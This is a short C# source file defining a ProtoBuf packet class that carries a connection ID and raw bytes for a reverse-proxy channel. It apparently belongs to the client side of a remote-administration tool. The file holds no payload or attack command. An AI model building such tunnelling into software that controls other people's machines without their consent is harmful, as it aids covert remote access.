using ProtoBuf;
using System;
using System.Collections.Generic;
using System.Text;
using xClient.Core.Packets;

namespace xClient.Core.ReverseProxy.Packets
{
    [ProtoContract]
    public class ReverseProxy_Data : IPacket
    {
        [ProtoMember(1)]
        public int ConnectionId { get; set; }

        [ProtoMember(2)]
        public byte[] Data { get; set; }

        public ReverseProxy_Data()
        {

        }

        public ReverseProxy_Data(int ConnectionId, byte[] Data)
        {
            this.ConnectionId = ConnectionId;
            this.Data = Data;
        }

        public void Execute(Client client)
        {
            client.Send<ReverseProxy_Data>(this);
        }
    }
}
